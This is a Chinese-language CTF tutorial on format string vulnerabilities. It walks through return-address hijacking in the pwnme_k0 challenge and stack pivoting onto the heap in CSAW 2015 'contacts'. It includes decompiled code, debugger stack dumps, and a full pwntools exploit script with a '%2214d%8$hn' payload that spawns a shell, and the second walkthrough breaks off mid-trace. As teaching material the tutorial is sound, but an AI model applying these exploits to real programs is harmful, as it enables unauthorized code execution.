retaddr\n\n\n\u539f\u7406\n\n\n\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5\u4e09\u4e2a\u767d\u5e3d-pwnme_k0\u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002\n\n\n\u786e\u5b9a\u4fdd\u62a4\n\n\n\u279c  \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git:\n(\nmaster\n)\n \u2717 checksec pwnme_k0\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53caFull RELRO\u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684got\u8868\u4e86\u3002\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\n\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\n\n\nint\n \n__usercall\n \nsub_400B07\n@\neax\n(\nchar\n \nformat\n@\ndil\n,\n \nchar\n \nformata\n,\n \n__int64\n \na3\n,\n \nchar\n \na4\n)\n\n\n{\n\n  \nwrite\n(\n0\n,\n \nWelc0me to sangebaimao!\n\\n\n,\n \n0x1AuLL\n);\n\n  \nprintf\n(\nformata\n,\n \nWelc0me to sangebaimao!\n\\n\n);\n\n  \nreturn\n \nprintf\n(\na4\n \n+\n \n4\n);\n\n\n}\n\n\n\n\n\n\u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a\na4+4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684passwrod\u5185\u5bb9\u4e5f\u662f\n\n\n    \nv6\n \n=\n \nread\n(\n0\n,\n \n(\nchar\n \n*\n)\na4\n \n+\n \n4\n,\n \n0x14uLL\n);\n\n\n\n\n\n\u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684username\u5728\u8ddd\u79bb\u7684password20\u4e2a\u5b57\u8282\u3002\n\n\n  \nputs\n(\nInput your username(max lenth:20): \n);\n\n  \nfflush\n(\nstdout\n);\n\n  \nv8\n \n=\n \nread\n(\n0\n,\n \nbufa\n,\n \n0x14uLL\n);\n\n  \nif\n \n(\n \nv8\n \n \nv8\n \n=\n \n0x14u\n \n)\n\n  \n{\n\n    \nputs\n(\nInput your password(max lenth:20): \n);\n\n    \nfflush\n(\nstdout\n);\n\n    \nv6\n \n=\n \nread\n(\n0\n,\n \n(\nchar\n \n*\n)\na4\n \n+\n \n4\n,\n \n0x14uLL\n);\n\n    \nfflush\n(\nstdout\n);\n\n    \n*\n(\n_QWORD\n \n*\n)\nbuf\n \n=\n \nbufa\n;\n\n    \n*\n(\n_QWORD\n \n*\n)(\nbuf\n \n+\n \n8\n)\n \n=\n \na3\n;\n\n    \n*\n(\n_QWORD\n \n*\n)(\nbuf\n \n+\n \n16\n)\n \n=\n \na4\n;\n\n\n\n\n\n\u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u572800000000004008A6\u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528system('bin/sh')\u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86shell\u3002\n\n\n\u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8erbp\u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u786e\u5b9a\u504f\u79fb\n\n\n\u83b7\u53d6\u51fd\u6570\u7684rbp\u4e0e\u8fd4\u56de\u5730\u5740\n\n\n\u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\n\n\n\u5c06\u6267\u884csystem\u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002\n\n\n\n\n\u786e\u5b9a\u504f\u79fb\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540daaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2aprintf(\na4 + 4)\u51fd\u6570\u5904\n\n\nRegister Account first!\nInput your username(max lenth:20): \naaaaaaaa\nInput your password(max lenth:20): \n%p%p%p%p%p%p%p%p%p%p\nRegister Success!!\n1.Sh0w Account Infomation!\n2.Ed1t Account Inf0mation!\n3.QUit sangebaimao:(\n\nerror options\n1.Sh0w Account Infomation!\n2.Ed1t Account Inf0mation!\n3.QUit sangebaimao:(\n\n1\n...\n\n\n\n\n\u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500\n     0x400b1a                  call   0x400758\n     0x400b1f                  lea    rdi, [rbp+0x10]\n     0x400b23                  mov    eax, 0x0\n \u2192   0x400b28                  call   0x400770\n   \u21b3    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0\n        0x400776                  xchg   ax, ax\n        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8\n        0x40077e                  xchg   ax, ax\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80  \u2192  0x00007fffffffdc30  \u2192  0x0000000000400eb0  \u2192   push r15     \u2190 $rsp, $rbp\n0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74  \u2192   add rsp, 0x30\n0x00007fffffffdb50\u2502+0x10: \naaaaaaaa\n     \u2190 $rdi\n0x00007fffffffdb58\u2502+0x18: 0x000000000000000a\n0x00007fffffffdb60\u2502+0x20: 0x7025702500000000\n0x00007fffffffdb68\u2502+0x28: \n%p%p%p%p%p%p%p%pM\\r@\n\n0x00007fffffffdb70\u2502+0x30: \n%p%p%p%pM\\r@\n\n0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d  \u2192   cmp eax, 0x2\n\n\n\n\n\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a5+3=8\u3002\n\n\n\u4fee\u6539\u5730\u5740\n\n\n\u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\u5904\u6808\u7684\u4fe1\u606f\n\n\n0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80  \u2192  0x00007fffffffdc30  \u2192  0x0000000000400eb0  \u2192   push r15     \u2190 $rsp, $rbp\n0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74  \u2192   add rsp, 0x30\n0x00007fffffffdb50\u2502+0x10: \naaaaaaaa\n     \u2190 $rdi\n0x00007fffffffdb58\u2502+0x18: 0x000000000000000a\n0x00007fffffffdb60\u2502+0x20: 0x7025702500000000\n0x00007fffffffdb68\u2502+0x28: \n%p%p%p%p%p%p%p%pM\\r@\n\n0x00007fffffffdb70\u2502+0x30: \n%p%p%p%pM\\r@\n\n0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d  \u2192   cmp eax, 0x2\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740(\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528showaccounth\u51fd\u6570\u65f6\u6267\u884cpush rip\u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a7\u3002\n\n\n\u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb0x00007fffffffdb80-0x00007fffffffdb48=0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86rbp\u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002\n\n\n0x0000000000400d74\u4e0e0x00000000004008A6\u53ea\u6709\u4f4e2\u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u65390x00007fffffffdb48\u5f00\u59cb\u76842\u4e2a\u5b57\u8282\u3002\n\n\n\u5229\u7528\u7a0b\u5e8f\n\n\n\u8fd9\u91cc\u4f7f\u7528data[1:]\u7684\u539f\u56e0\u662f\u5f53\u6211\u4eecsplit\u7684\u65f6\u5019\u7531\u4e8e\u8d77\u59cb\u7684\u662f0x\uff0c\u6240\u4ee5\u4f1a\u4ea7\u751f\u2018\u2019\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u8df3\u8fc7\u3002\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \n*\n\n\npwnme\n \n=\n \nELF\n(\n./pwnme_k0\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\n11\n,\n \n11\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./pwnme_k0\n)\n\n\nsh\n.\nrecvuntil\n(\n:\n\\n\n)\n\n\nsh\n.\nsendline\n(\na\n \n*\n \n8\n)\n\n\nsh\n.\nrecvuntil\n(\n:\n\\n\n)\n\n\nsh\n.\nsendline\n(\n%p\n \n*\n \n9\n)\n\n\nsh\n.\nrecvuntil\n(\n)\n\n\nsh\n.\nsendline\n(\n1\n)\n\n\nsh\n.\nrecvuntil\n(\na\n \n*\n \n8\n \n+\n \n\\n\n)\n\n\ndata\n \n=\n \nsh\n.\nrecvuntil\n(\n1.\n,\n \ndrop\n=\nTrue\n)\n.\nsplit\n(\n0x\n)\n\n\nprint\n \ndata\n\n\ndata\n \n=\n \ndata\n[\n1\n:]\n\n\nrbp\n \n=\n \nint\n(\ndata\n[\n5\n],\n \n16\n)\n\n\nret_addr\n \n=\n \nrbp\n \n-\n \n0x38\n\n\nsh\n.\nrecvuntil\n(\n)\n\n\nsh\n.\nsendline\n(\n2\n)\n\n\nsh\n.\nrecvuntil\n(\n:\n\\n\n)\n\n\nsh\n.\nsendline\n(\np64\n(\nret_addr\n))\n\n\nsh\n.\nrecvuntil\n(\n:\n\\n\n)\n\n\npayload\n \n=\n \n%2214d\n%8$hn\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nrecvuntil\n(\n)\n\n\nsh\n.\nsendline\n(\n1\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\n\n\n\u539f\u7406\n\n\n\u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74CSAW\u4e2d\u7684contacts\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\u786e\u5b9a\u4fdd\u62a4\n\n\n\u279c  \n2015\n-CSAW-contacts git:\n(\nmaster\n)\n \u2717 checksec contacts\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86NX\u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86Canary\u3002\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\n\u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u8f93\u5165\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\n\n\nint\n \n__cdecl\n \nPrintInfo\n(\nint\n \na1\n,\n \nint\n \na2\n,\n \nint\n \na3\n,\n \nchar\n \n*\nformat\n)\n\n\n{\n\n  \nprintf\n(\n\\t\nName: %s\n\\n\n,\n \na1\n);\n\n  \nprintf\n(\n\\t\nLength %u\n\\n\n,\n \na2\n);\n\n  \nprintf\n(\n\\t\nPhone #: %s\n\\n\n,\n \na3\n);\n\n  \nprintf\n(\n\\t\nDescription: \n);\n\n  \nreturn\n \nprintf\n(\nformat\n);\n\n\n}\n\n\n\n\n\n\u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2aformat\u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684shell\uff0c\u4ece\u800c\u62ff\u5230flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301got\u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b\n\n\n\n\n\u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301got\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709printf\u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020/bin/sh\u8ba9\u5b83\u6267\u884csystem('/bin/sh')\uff0c\u4f46\u662fprintf\u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002\n\n\n\u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165system_addr+'bbbb'+addr of '/bin/sh\u2018\u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack pivoting\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7leave\u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58ebp\u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884cleave\u6307\u4ee4\u7684\u65f6\u5019\uff0cesp\u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58ebp\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6PrintInfo\u51fd\u6570\u4e2d\u5b58\u50a8ebp\u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c\n\u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684ebp\u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58ebp\u503c\u7684\u5730\u5740\n\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176\n\u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684ebp\u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373main\u51fd\u6570\uff09\u7684ebp\u6570\u503c\n\u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002\n\n\n\u57fa\u672c\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u9996\u5148\u83b7\u53d6system\u51fd\u6570\u7684\u5730\u5740\n\n\n\u901a\u8fc7\u6cc4\u9732\u67d0\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6839\u636elibc database\u786e\u5b9a\u3002\n\n\n\n\n\n\n\u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3asystem_addr+'bbbb'+binsh_addr\n\n\n\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684ebp)\u4e3a\n\u5b58\u50a8system_addr\u7684\u5730\u5740-4\n\u3002\n\n\n\u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c\n\n\nmove esp,ebp\uff0c\u5c06esp\u6307\u5411system_addr\u7684\u5730\u5740-4\n\n\npop ebp\uff0c \u5c06esp\u6307\u5411system_addr\n\n\nret\uff0c\u5c06eip\u6307\u5411system_addr\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\n\n\n\n\n\n\n\n\n\u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53caPrintInfo\u51fd\u6570\u7684\u5730\u5740\u3002\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684libc_start_main_ret\u5730\u5740(\u8be5\u5730\u5740\u662f\u5f53main\u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570)\u6765\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728printf\u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684printf\u51fd\u6570\u5904\uff0c\u5982\u4e0b\n\n\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret    \n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccfc\n, \nl8\n]\n\n\n8\n\n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0x0804c420  \u2192  \n1234567\n\n0xffffcd04\u2502+0x08: 0x0804c410  \u2192  \n11111\n\n0xffffcd08\u2502+0x0c: 0xf7e5acab  \u2192  \nputs+11\n add ebx, 0x152355\n0xffffcd0c\u2502+0x10: 0x00000000\n0xffffcd10\u2502+0x14: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd14\u2502+0x18: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190 \n$ebp\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n trace \n]\n\u2500\u2500\u2500\u2500\n\n[\n#0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \n1234567\\n\n)\n\n\n[\n#1] 0x8048c27 \u2192 leave \n\n\n[\n#2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1\n\n\n[\n#3] 0x80487a2 \u2192 jmp 0x80487b3\n\n\n[\n#4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, 